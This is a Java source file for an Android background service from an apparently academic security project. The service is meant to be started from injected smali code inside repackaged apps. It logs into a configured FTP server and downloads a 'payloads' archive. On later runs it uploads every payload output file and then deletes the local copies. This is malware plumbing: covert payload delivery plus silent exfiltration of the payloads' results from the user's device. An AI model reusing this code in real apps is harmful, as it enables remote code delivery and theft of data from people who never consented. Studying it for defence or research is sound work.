package it.unisannio.srss.dame.android.services;

import java.io.File;
import java.io.IOException;
import java.net.SocketException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class NetworkService extends Service {

	private final static String TAG = NetworkService.class.getSimpleName();

	private final Object downloadLock = new Object();
	private final Object uploadLock = new Object();
	private FTPService ftpServer = null;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// controlla se ha già scaricato i payload
		if ((new File(Utils.getPayloadsArchivePath(this))).exists()) {
			// l'archivio dei payloads è stato già scaricato
			// in questo caso si fa l'upload di eventuali file di output
			uploadOutputs();
		} else {
			// l'archivio non è stato ancora scaricato
			downloadPayloads();
		}
		return super.onStartCommand(intent, flags, startId);
	}

	private void downloadPayloads() {
		new Thread() {
			@Override
			public void run() {
				synchronized (downloadLock) {
					Log.i(TAG, "Trying to download the payloads");
					String downloadUri = Utils
							.getPayloadsDownloadUrl(getClass());
					Log.i(TAG, "Download URL: " + downloadUri);
					String localFilePath = Utils
							.getPayloadsArchivePath(getApplicationContext());
					Log.i(TAG, "Local file path: " + localFilePath);

					FTPService ftp = getFtpServer();

					try {
						ftp.connect();
						ftp.downloadFile(downloadUri, localFilePath);
					} catch (SocketException e) {
						ftp.disconnect();
						Log.e(TAG, "Not connected, socket exception");

					} catch (IOException e) {
						Log.e(TAG, "Not connected, IOException");
					}

				}
			};
		}.start();
	}

	private void uploadOutputs() {
		new Thread() {
			@Override
			public void run() {
				synchronized (uploadLock) {
					Log.i(TAG, "Trying to upload the payload's outputs");
					String localOutputDir = Utils
							.getPayloadsOutputDir(getApplicationContext());
					Log.i(TAG, "Output dir: " + localOutputDir);
					String remoteOutputUri = Utils.getUploadUrl(getClass());
					Log.i(TAG, "Remote URL: " + remoteOutputUri);

					FTPService ftp = getFtpServer();

					File outputDir = new File(localOutputDir);
					File[] results = outputDir.listFiles();

					if (results.length > 0) {
						try {
							ftp.connect();
							for (File result : results){
								Log.d(TAG, "Sending " + result.getAbsolutePath());
								ftp.uploadFile(result.getAbsolutePath(),
										remoteOutputUri);
								Log.d(TAG, result.getAbsolutePath() + " sent!");
								result.delete();
							}
						} catch (SocketException e) {
							ftp.disconnect();
							Log.e(TAG, "Not connected, socket exception");
						} catch (IOException e) {
							Log.e(TAG, "Not connected, IOException");
						}
					}
				}
			};
		}.start();
	}

	/**
	 * Questo metodo viene usato per utilità per semplificare la chiamata di
	 * avvio del servizio nel codice smali.
	 * 
	 * @param c
	 */
	public static void doNetworkStuff(Object c) {
		Log.i(TAG, "Network call from " + c.getClass().getName());
		if (c instanceof Context) {
			Log.i(TAG, "Network call accepted");
			((Context) c).startService(new Intent((Context) c,
					NetworkService.class));
		}else{
			Log.i(TAG, "Network call rejected");
		}
	}

	private FTPService getFtpServer() {
		if (ftpServer == null) {
			String serverURL = Utils.getFtpURL(getClass());
			String port = serverURL.substring(serverURL.indexOf(":")+1);
			serverURL = serverURL.substring(0, serverURL.indexOf(":"));
			
			String username = Utils.getFtpUsername(getClass());
			String password = Utils.getFtpPassword(getClass());
			
			
			// erase final slash
			if(port.endsWith("/"))
				port = port.substring(0, port.length()-1);
			
			ftpServer = new FTPService(serverURL, Integer.parseInt(port),username, password);
		}

		return ftpServer;
	}
}
